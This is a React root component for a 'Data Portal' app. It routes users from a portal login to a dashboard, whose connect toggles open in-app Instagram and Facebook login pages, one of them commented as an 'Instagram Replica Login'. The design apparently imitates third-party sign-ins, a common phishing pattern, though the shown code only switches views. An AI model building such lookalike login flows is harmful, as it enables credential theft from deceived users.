import { useState } from 'react';
import DataPortalLogin from './pages/DataPortalLogin';
import LoginPage from './pages/LoginPage';
import Dashboard from './pages/Dashboard';
import InstagramLogin from './pages/InstagramLogin';
import FacebookLogin from './pages/FacebookLogin';
import ThankYouPage from './pages/ThankYouPage';

/**
 * App - Root component for the Data Portal application.
 * Controls routing between:
 * 1. Portal Login (custom brand)
 * 2. Google Authenticator
 * 3. User Dashboard
 * 4. Instagram Replica Login
 */
function App() {
  const [view, setView] = useState('portal-login'); // 'portal-login' | 'google-authenticator' | 'dashboard' | 'instagram-login' | 'facebook-login' | 'thank-you'
  const [userEmail, setUserEmail] = useState('');
  const [isFormCompleted, setIsFormCompleted] = useState(false);
  const [connections, setConnections] = useState({
    facebook: false,
    instagram: false
  });

  const handleGoogleLoginClick = () => {
    setView('google-authenticator');
  };

  const handleLoginSuccess = (email) => {
    setUserEmail(email);
    setView('dashboard');
  };

  const handleLogout = () => {
    setUserEmail('');
    setView('portal-login');
  };

  const handleToggleConnection = (platform) => {
    if (platform === 'instagram' && !connections.instagram) {
      setView('instagram-login');
    } else if (platform === 'facebook' && !connections.facebook) {
      setView('facebook-login');
    } else {
      setConnections(prev => ({
        ...prev,
        [platform]: !prev[platform]
      }));
    }
  };

  if (view === 'google-authenticator') {
    return (
      <LoginPage 
        onBack={() => setView('portal-login')} 
        onLoginSuccess={handleLoginSuccess}
      />
    );
  }

  if (view === 'instagram-login') {
    return (
      <InstagramLogin 
        onCancel={() => setView('dashboard')}
        onLoginSuccess={() => {
          setConnections(prev => ({ ...prev, instagram: true }));
          setView('dashboard');
        }}
      />
    );
  }

  if (view === 'facebook-login') {
    return (
      <FacebookLogin
        userEmail={userEmail}
        onCancel={() => setView('dashboard')}
        onLoginSuccess={() => {
          setConnections(prev => ({ ...prev, facebook: true }));
          setView('dashboard');
        }}
      />
    );
  }

  if (view === 'dashboard') {
    return (
      <Dashboard 
        userEmail={userEmail} 
        onLogout={handleLogout} 
        connections={connections}
        onToggleConnection={handleToggleConnection}
        isFormCompleted={isFormCompleted}
        setIsFormCompleted={setIsFormCompleted}
        onSubmitSuccess={() => setView('thank-you')}
      />
    );
  }

  if (view === 'thank-you') {
    return <ThankYouPage />;
  }

  return <DataPortalLogin onGoogleLoginClick={handleGoogleLoginClick} />;
}

export default App;
